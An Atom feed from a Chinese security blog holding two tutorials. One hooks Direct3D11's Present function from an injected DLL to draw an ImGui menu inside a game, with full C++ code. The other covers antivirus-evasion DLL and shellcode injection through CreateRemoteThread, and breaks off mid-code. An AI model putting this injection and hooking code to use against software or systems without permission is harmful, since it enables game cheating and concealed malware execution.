<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Joe1sn&#39;s Cabinet</title>
  
  
  <link href="https://joe1sn.eu.org/atom.xml" rel="self"/>
  
  <link href="https://joe1sn.eu.org/"/>
  <updated>2025-01-26T14:46:00.784Z</updated>
  <id>https://joe1sn.eu.org/</id>
  
  <author>
    <name>Joe1sn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【破解】使用hook再游戏内部创建菜单栏</title>
    <link href="https://joe1sn.eu.org/2024/10/11/d3d11-hook/"/>
    <id>https://joe1sn.eu.org/2024/10/11/d3d11-hook/</id>
    <published>2024-10-11T06:12:09.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>学习是对技术的祛魅</p><p>公众号：</p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="direct3d11-注入"><a class="markdownIt-Anchor" href="#direct3d11-注入"></a> Direct3D11 注入</h1><p>在此之前，公众号已经简述了<code>MinHook</code>的原理，那么利用这种原理我们就可以通过hook在d3d编写的游戏中实现窗口</p><p>相关代码：<a href="https://github.com/Joe1sn/dx11-hook-example">https://github.com/Joe1sn/dx11-hook-example</a></p><h2 id="direct3d简述"><a class="markdownIt-Anchor" href="#direct3d简述"></a> Direct3D简述</h2><p>这里使用<code>ImGui</code>的默认dx11版本示例来讲解，首先d3d的绘制依靠的是windows的窗口(window)，接着是D3D设备、上下文和交换链以及各种绘制方法的d3dAPI传入操作系统和GPU，最后传输到显示器显示，大致如下</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6ad88f19b612a87f0fb01fa263ec643b.png" alt="d3d" style="zoom:33%;" /><p>那么对于d3d API来说是这样的：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/95bce98f171ccebac244f038b7c2fdad.png" alt="d3d2" /></p><h2 id="如何显示"><a class="markdownIt-Anchor" href="#如何显示"></a> 如何显示</h2><p>那么最后如何得到渲染好的最终帧呢？答案是交换链的 <code>IDXGISwapChain::Present</code> 方法用于呈现最终渲染的帧</p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nn-dxgi-idxgiswapchain">https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nn-dxgi-idxgiswapchain</a></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4824f10eb0ef21a90370e4945328cdfe.png" alt="image-20240917122252505" /></p><p>具体参数</p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nf-dxgi-idxgiswapchain-present">https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nf-dxgi-idxgiswapchain-present</a></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2f28850b01647a34c57d9de400ec9880.png" alt="image-20240917122310168" /></p><p>那么我们可以hook这个函数，然后提交我们要现实的内容，最后再一同显示出来</p><h2 id="编写dll"><a class="markdownIt-Anchor" href="#编写dll"></a> 编写DLL</h2><p>这里我就是用visual studio 2022 默认的DLL项目</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5ee8bb5398a29ab79eed633f6e706a8d.png" alt="image-20240917122615650" /></p><p>导入imgui和minhook</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dd7ca61bd48246964b9157a0cf175503.png" alt="image-20240917122813488" /></p><p>本篇文章将处理的是dx11版本的d3d，那么如何判断游戏是否使用了该dll呢？一般来说是凭借经验，不过也可以使用CE遍历一下DLL即可</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/49035b1e59e676e047d645fdfe4bd7c2.png" alt="image-20240917123134652" /></p><p>如果发现调用了多种图形API，例如OpenGL，Vulkan等，可查看使用调用对应的呈现最终帧的渲染函数，也可以参考kiero的一些做法，链接：<a href="https://github.com/Rebzzel/kiero">https://github.com/Rebzzel/kiero</a></p><p>那么如何找到该函数呢？别忘了最后的dll是注入到程序中的，那么我们的dll也可以使用<code>d3d11.dll</code>，而且前文提到过<code>IDXGISwapChain::Present</code>是<code>IDXGISwapChain</code>下的方法，那么我们如果也要使用该方法，也是会跳转到同一个位置（因为注入后就是同一个程序了，那么对应的dll的内存也是同一块）</p><p>而且<code>Present</code>是虚函数，位置在<code>vtable[8]</code>，</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/599e0ba67c882ef76728154004315291.png" alt="image-20240917131813505" /></p><p>那么可以得到定位函数，这里抄了下imgui例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">long</span><span class="params">(__stdcall* DIGX_Present)</span><span class="params">(IDXGISwapChain*, UINT, UINT)</span></span>;</span><br><span class="line">DIGX_Present originPresent;</span><br><span class="line">DIGX_Present old_present;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">getPresentPtr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Setup swap chain</span></span><br><span class="line">    DXGI_SWAP_CHAIN_DESC sd;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;sd, <span class="built_in">sizeof</span>(sd));</span><br><span class="line">    sd.BufferCount = <span class="number">2</span>;</span><br><span class="line">    sd.BufferDesc.Width = <span class="number">0</span>;</span><br><span class="line">    sd.BufferDesc.Height = <span class="number">0</span>;</span><br><span class="line">    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;</span><br><span class="line">    <span class="comment">//sd.BufferDesc.RefreshRate.Numerator = 60;         跟随游戏的fps</span></span><br><span class="line">    <span class="comment">//sd.BufferDesc.RefreshRate.Denominator = 1;        跟随游戏</span></span><br><span class="line">    sd.OutputWindow = <span class="built_in">GetForegroundWindow</span>();        <span class="comment">//  跟随游戏窗口</span></span><br><span class="line">    sd.SampleDesc.Count = <span class="number">1</span>;</span><br><span class="line">    sd.Windowed = TRUE;</span><br><span class="line">    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;</span><br><span class="line"></span><br><span class="line">    UINT createDeviceFlags = <span class="number">0</span>;</span><br><span class="line">    IDXGISwapChain* swap_chain;</span><br><span class="line">    ID3D11Device* device;</span><br><span class="line"></span><br><span class="line">    D3D_FEATURE_LEVEL featureLevel;</span><br><span class="line">    <span class="type">const</span> D3D_FEATURE_LEVEL featureLevelArray[<span class="number">2</span>] = &#123; D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, &#125;;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">D3D11CreateDeviceAndSwapChain</span>(</span><br><span class="line">        <span class="literal">nullptr</span>, </span><br><span class="line">        D3D_DRIVER_TYPE_HARDWARE, </span><br><span class="line">        <span class="literal">nullptr</span>, </span><br><span class="line">        createDeviceFlags, </span><br><span class="line">        featureLevelArray, </span><br><span class="line">        <span class="number">2</span>, </span><br><span class="line">        D3D11_SDK_VERSION, </span><br><span class="line">        &amp;sd, </span><br><span class="line">        &amp;swap_chain,</span><br><span class="line">        &amp;device,</span><br><span class="line">        &amp;featureLevel, </span><br><span class="line">        <span class="literal">nullptr</span>) == S_OK) &#123;</span><br><span class="line">        <span class="type">void</span>** p_vtable = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>***&gt;(swap_chain);   <span class="comment">//得到虚函数表</span></span><br><span class="line">        swap_chain-&gt;<span class="built_in">Release</span>();      <span class="comment">//释放</span></span><br><span class="line">        device-&gt;<span class="built_in">Release</span>();          <span class="comment">//释放</span></span><br><span class="line">        old_present = (DIGX_Present)p_vtable[<span class="number">8</span>];    <span class="comment">//从虚函数表得到present函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确定下主线程的主要结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&quot;main&quot; loop</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">main</span><span class="params">(HMODULE hModule)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.获得函数</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getPresentPtr</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.开始hook</span></span><br><span class="line">    <span class="comment">//  2.1 hook初始化</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_Initialize</span>() != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//  2.2 创建hook</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_CreateHook</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>**&gt;(old_present), &amp;myPresent, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>**&gt;(&amp;originPresent)) != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//  2.3 启用hook</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_EnableHook</span>(old_present) != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 3.等待 F1 退出</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_F1)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.退出hook，清理</span></span><br><span class="line">        <span class="comment">//Cleanup</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_DisableHook</span>(MH_ALL_HOOKS) != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MH_Uninitialize</span>() != MH_OK)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">FreeLibraryAndExitThread</span>(hModule, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH: &#123;</span><br><span class="line">        <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)main, hModule, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成<code>myPresent</code>来替换旧的<code>Present</code>，这里依旧是抄了写imgui的示例代码，主要还是参考示例代码中的初始化和绘制的步骤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">WNDPROC oWndProc;</span><br><span class="line"><span class="comment">// Forward declare message handler from imgui_impl_win32.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> IMGUI_IMPL_API LRESULT <span class="title">ImGui_ImplWin32_WndProcHandler</span><span class="params">(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Win32 message handler</span></span><br><span class="line"><span class="comment">// You can read the io.WantCaptureMouse, io.WantCaptureKeyboard flags to tell if dear imgui wants to use your inputs.</span></span><br><span class="line"><span class="comment">// - When io.WantCaptureMouse is true, do not dispatch mouse input data to your main application, or clear/overwrite your copy of the mouse data.</span></span><br><span class="line"><span class="comment">// - When io.WantCaptureKeyboard is true, do not dispatch keyboard input data to your main application, or clear/overwrite your copy of the keyboard data.</span></span><br><span class="line"><span class="comment">// Generally you may always pass all inputs to dear imgui, and hide them from your application based on those two flags.</span></span><br><span class="line"><span class="function">LRESULT WINAPI <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ImGui_ImplWin32_WndProcHandler</span>(hWnd, msg, wParam, lParam))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ::<span class="built_in">DefWindowProcW</span>(hWnd, msg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> init = <span class="literal">false</span>;</span><br><span class="line">HWND window = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> ID3D11Device* g_pd3dDevice = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="type">static</span> ID3D11DeviceContext* g_pd3dDeviceContext = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="type">static</span> ID3D11RenderTargetView* g_mainRenderTargetView = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> __stdcall <span class="title">myPresent</span><span class="params">(IDXGISwapChain* p_swap_chain, UINT sync_interval, UINT flags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!init) &#123;</span><br><span class="line">        <span class="comment">//从swap chain获得device</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">SUCCEEDED</span>(p_swap_chain-&gt;<span class="built_in">GetDevice</span>(__uuidof(ID3D11Device), (<span class="type">void</span>**)&amp;g_pd3dDevice)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//获得上下文</span></span><br><span class="line">            g_pd3dDevice-&gt;<span class="built_in">GetImmediateContext</span>(&amp;g_pd3dDeviceContext);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            DXGI_SWAP_CHAIN_DESC sd;</span><br><span class="line">            p_swap_chain-&gt;<span class="built_in">GetDesc</span>(&amp;sd);</span><br><span class="line">            window = sd.OutputWindow;</span><br><span class="line">            ID3D11Texture2D* pBackBuffer;</span><br><span class="line">            p_swap_chain-&gt;<span class="built_in">GetBuffer</span>(<span class="number">0</span>, __uuidof(ID3D11Texture2D), (LPVOID*)&amp;pBackBuffer);</span><br><span class="line">            g_pd3dDevice-&gt;<span class="built_in">CreateRenderTargetView</span>(pBackBuffer, <span class="literal">NULL</span>, &amp;g_mainRenderTargetView);</span><br><span class="line">            pBackBuffer-&gt;<span class="built_in">Release</span>();</span><br><span class="line"></span><br><span class="line">            oWndProc = (WNDPROC)<span class="built_in">SetWindowLongPtr</span>(window, GWLP_WNDPROC, (LONG_PTR)WndProc);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建imgui上下文</span></span><br><span class="line">            ImGui::<span class="built_in">CreateContext</span>();</span><br><span class="line">            ImGuiIO&amp; io = ImGui::<span class="built_in">GetIO</span>(); (<span class="type">void</span>)io;</span><br><span class="line">            io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     <span class="comment">// Enable Keyboard Controls</span></span><br><span class="line">            io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      <span class="comment">// Enable Gamepad Controls</span></span><br><span class="line"></span><br><span class="line">            ImGui::<span class="built_in">StyleColorsDark</span>();</span><br><span class="line"></span><br><span class="line">            ImGuiStyle&amp; style = ImGui::<span class="built_in">GetStyle</span>();</span><br><span class="line">            <span class="keyword">if</span> (io.ConfigFlags)</span><br><span class="line">            &#123;</span><br><span class="line">                style.WindowRounding = <span class="number">0.0f</span>;</span><br><span class="line">                style.Colors[ImGuiCol_WindowBg].w = <span class="number">1.0f</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ImGui_ImplWin32_Init</span>(window);</span><br><span class="line">            <span class="built_in">ImGui_ImplDX11_Init</span>(g_pd3dDevice, g_pd3dDeviceContext);</span><br><span class="line">            init = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">originPresent</span>(p_swap_chain, sync_interval, flags);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ImGui_ImplDX11_NewFrame</span>();</span><br><span class="line">    <span class="built_in">ImGui_ImplWin32_NewFrame</span>();</span><br><span class="line"></span><br><span class="line">    ImGui::<span class="built_in">NewFrame</span>();</span><br><span class="line"></span><br><span class="line">    ImGui::<span class="built_in">ShowDemoWindow</span>();</span><br><span class="line"></span><br><span class="line">    ImGui::<span class="built_in">EndFrame</span>();</span><br><span class="line">    ImGui::<span class="built_in">Render</span>();</span><br><span class="line">    g_pd3dDeviceContext-&gt;<span class="built_in">OMSetRenderTargets</span>(<span class="number">1</span>, &amp;g_mainRenderTargetView, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">ImGui_ImplDX11_RenderDrawData</span>(ImGui::<span class="built_in">GetDrawData</span>());</span><br><span class="line">    <span class="comment">// Update and Render additional Platform Windows</span></span><br><span class="line">    <span class="comment">//if (io.ConfigFlags &amp; ImGuiConfigFlags_ViewportsEnable)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    ImGui::UpdatePlatformWindows();</span></span><br><span class="line">    <span class="comment">//    ImGui::RenderPlatformWindowsDefault();</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// Present</span></span><br><span class="line">    <span class="comment">//HRESULT hr = g_pSwapChain-&gt;Present(1, 0);   // Present with vsync</span></span><br><span class="line">    <span class="comment">////HRESULT hr = g_pSwapChain-&gt;Present(0, 0); // Present without vsync</span></span><br><span class="line">    <span class="comment">//g_SwapChainOccluded = (hr == DXGI_STATUS_OCCLUDED);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">originPresent</span>(p_swap_chain, sync_interval, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f950e1c8830aacf20c596032f21d2345.png" alt="image-20240917134455215" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习是对技术的祛魅&lt;/p&gt;
&lt;p&gt;公众号：&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="source" scheme="https://joe1sn.eu.org/tags/source/"/>
    
    <category term="MinHook" scheme="https://joe1sn.eu.org/tags/MinHook/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】常见的DLL和Shellcode注入方式</title>
    <link href="https://joe1sn.eu.org/2024/10/01/dll-inject/"/>
    <id>https://joe1sn.eu.org/2024/10/01/dll-inject/</id>
    <published>2024-10-01T06:50:28.000Z</published>
    <updated>2025-02-27T06:50:41.055Z</updated>
    
    <content type="html"><![CDATA[<p>公众号：<a href="https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ">https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="免杀常见的dll和shellcode注入方式"><a class="markdownIt-Anchor" href="#免杀常见的dll和shellcode注入方式"></a> 【免杀】常见的DLL和Shellcode注入方式</h1><p>这里的dll和shellcode注入指的是动态的注入，及进程运行时的注入</p><p>关于代码可以从github仓库找到：<a href="https://github.com/Joe1sn/S-inject">https://github.com/Joe1sn/S-inject</a></p><h1 id="a-dll注入"><a class="markdownIt-Anchor" href="#a-dll注入"></a> A. DLL注入</h1><p>首先回顾一下一个程序是如何加载dll的，使用的是<code>kernel32.dll</code>的<code>LoadLibraryA</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HMODULE <span class="title">LoadLibraryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>lpLibFileName</code>就是dll文件的路径</p><p>由于本篇只是简单的、常见的方法，没有涉及如天堂之门（Heaven’s Gate）等高级技术，需要暂时认为</p><ul><li>64位dll只能使用64位注入器注入64位程序，32位也是如此</li></ul><h2 id="远程线程调用注入"><a class="markdownIt-Anchor" href="#远程线程调用注入"></a> 远程线程调用注入</h2><p>这里用到的是函数<code>createRemoteThread </code>函数，主要作用就是再其他进程创建一个新的线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE                 hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T                 dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID                 lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD                  dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD                lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>hProcess</code>：远程进程句柄</li><li><code>lpStartAddress</code>：线程执行的应用程序定义函数的指针，表示远程进程中线程的起始地址。 函数必须存在于远程进程中</li><li><code>lpParameter</code>：对应的参数</li></ul><p><strong>那么可以得到思路：</strong></p><ol><li><p>将dll的路径写入远程的进程(待注入的进程)</p></li><li><p>获得远程进程<code>LoadLibraryA</code>函数的地址</p><p>这里有个小小的trick，windows加载核心DLL（如<code>ntdll.dll</code>，<code>kernel32.dll</code>）的时候，相对于内存的位置是固定的，也就是加载到进程的内存是相对固定的，那么我们加载这些dll的内存位置和远程进程的是一样的</p></li><li><p>使用<code>createRemoteThread </code>创建新的进程</p></li></ol><p>可以得到如下代码（为了排版，所有代码都会省略掉无关部分）</p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L88">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L88</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*                  Remote Thread Injection                  */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::RemoteThreadInject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//1.获得远程进程句柄</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="comment">//2.在远程进程中创建内存空间，内存RWX</span></span><br><span class="line">    LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span 